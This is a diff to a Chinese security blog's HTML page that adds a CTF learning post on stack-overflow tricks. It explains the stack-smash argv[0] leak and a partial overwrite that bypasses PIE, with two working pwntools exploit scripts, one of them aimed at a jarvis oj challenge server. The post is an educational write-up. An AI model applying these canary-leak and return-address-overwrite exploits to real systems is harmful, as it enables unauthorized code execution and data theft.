@@ -252,6 +252,222 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/22/pwn学习（7）花式栈溢出2/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/22/pwn学习（7）花式栈溢出2/" itemprop="url">pwn学习（7）花式栈溢出2</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-22T21:58:58+08:00">
+                2018-11-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>唉，学业繁忙，计算机网络和数据结构马上就要结课了还要拿出时间来复习，感觉最近时间有些不够用。不抱怨了，还是看看今天看的两个知识点，可能写的不是很详细，主要还是时间不太够了。</p>
+<h1 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们都知道有个保护措施叫canary，简单来讲就是在push ebp之后在栈上放个“哨位”，“监视”你的栈，一旦你想溢出，那势必就会破坏这个“哨位”，程序在最后回去检查这个“哨位”，如果你篡改了，那就会报错了</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxh7xp4r3dj30nm030q3o.jpg" alt=""></p>
+<p>如图就是函数在开始时进行的设置“哨位”</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxh80n0v9ej30h202mt97.jpg" alt=""></p>
+<p>这是在函数最后的检查</p>
+<p>当然明白了这些还不够，我们还需要知道一点关于这个错误的一些信息，下面我们试着覆盖掉canary来看看会发生什么</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxh8djl3uuj314s0hcqfn.jpg" alt=""></p>
+<p>可以看到除了程序的输出外，还额外打印了一句</p>
+<pre><code>*** stack smashing detected ***: ./smashes.dms terminated
+</code></pre><p>这就是重点了，他告诉我们出错了，而且附加了我们的程序名字！名字哪来的？大胆猜猜，在开始运行输入的命令行中，arg0就是我们的程序名！当然这是瞎猜的，秉持着唯真求新的校训，我们还是来看一看具体的实现原理</p>
+<pre><code>void __attribute__ ((noreturn)) __stack_chk_fail (void)
+{
+  __fortify_fail (&quot;stack smashing detected&quot;);
+}
+void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
+{
+  /* The loop is added only to keep gcc happy.  */
+  while (1)
+    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,
+                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
+}
+</code></pre><p>可以看到竟（guo）然（ran）和我们想的一样，那我们就可以想到了，那我们只要覆盖掉arg0，那我们岂不是就可以借助这个输入拿到我们想要的信息了？</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>知道了原理那就赶紧做个题目练练手吧，题目来自jarvis oj，名字是smashes，大家可以自己去下载一下</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxh8ssx30tj310o0isjvd.jpg" alt=""></p>
+<p>保护开启了nx、canary，ida看一下发现有明显的栈溢出漏洞，但还有个很好玩的地方，在我们输入第二个字符串后，它会将某个地址里的内容覆盖掉。我们查看后发现被覆盖掉的地方就是flag的存储位置。</p>
+<p>那么问题来了，不管输入什么我们的flag都会被覆盖，那一定flag就会被改掉吗？当然不是，这里需要一个小知识点了</p>
+<p><strong>在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找。</strong></p>
+<p>我们利用find CTF的方式就可以找到flag的另一处地址，紧接着我们可以在arg0上放入我们的flag地址，借助canary的错误机制将其打印出来，当然过程中需要使用gdb调试来获得包括arg0的地址、变量的地址等等，这就不细说了，直接上脚本了</p>
+<pre><code>from pwn import *
+#p = process(&apos;./smashes.dms&apos;)
+p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)
+flag_addr = 0x400d21
+arg0_addr = 0x7fffffffdf48
+name_addr = 0x7fffffffdd30
+payload = (arg0_addr - name_addr)*&apos;a&apos; + p64(flag_addr)
+
+p.recvuntil(&apos;name? &apos;)
+p.sendline(payload)
+p.recvuntil(&apos;flag: &apos;)
+p.sendline(&apos;bb&apos;)
+data = p.recv()
+log.info(data)
+</code></pre><p>要注意因为我们只是拿到了flag并没有get shell，所以最后不进行交互也可以，打印出来就好了</p>
+<h1 id="栈上的-partial-overwrite"><a href="#栈上的-partial-overwrite" class="headerlink" title="栈上的 partial overwrite"></a>栈上的 partial overwrite</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>在程序开启了 PIE 保护时 (PIE enabled) 高位的地址会发生随机化, 但低位的偏移是始终固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护</p>
+<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p>原理看上去有点难以理解，但有了例题就好理解多了，题目是安恒杯 2018 年 7 月月赛的 babypie </p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxh975vl2xj30ke08iq4o.jpg" alt=""></p>
+<p>保护开启了canary和pie，还是ida分析发现明显的栈溢出，这里就要用到一个骚操作了，我们看到read了最大0x30的字节，我们又知道read是不会给输入的字符串加上\0的结束符的，而printf又是读到00字节才结束输出，那也就是说我们可以输入一部分内容，然后顺带着输出canary，之后再进行栈溢出的时候我们就可以恢复canary的值了</p>
+<p>那具体该怎么实现呢？首先是ebp的地址离我们输入的buf偏移是0x30，当然ebp之后还有个0x8大小的canary，canary的最低字节是00，为了输出cannary剩下的值我们把这里也覆盖掉，也就是覆盖的字节数应该是0x30 - 0x8 + 1这么个大小</p>
+<p>拿到canary后我们就可以考虑如何构造payload了，因为程序中给了get shell函数，所以我们直接用ida得到的地址（可不是真实地址哦）来覆盖函数返回地址的低位，然后就是听天由命了，总有对的时候</p>
+<p>思路齐全，上exp喽</p>
+<pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+#  context.log_level = &quot;debug&quot;
+
+
+while True:
+    try:
+        io = process(&quot;./babypie.dms&quot;, timeout = 1)
+
+        #  gdb.attach(io)
+        io.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8 + 1))
+        io.recvuntil(&apos;a&apos; * (0x30 - 0x8 + 1))
+        canary = &apos;\0&apos; + io.recvn(7)
+        success(canary.encode(&apos;hex&apos;))
+
+        #  gdb.attach(io)
+        io.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8) + canary + &apos;bbbbbbbb&apos; + &apos;\x3E\x0A&apos;)
+
+        io.interactive()
+    except Exception as e:
+        io.close()
+        print e
+</code></pre><p>Successful</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/21/pwn学习（6）花式栈溢出1/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -2041,7 +2257,7 @@ p.interactive()
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
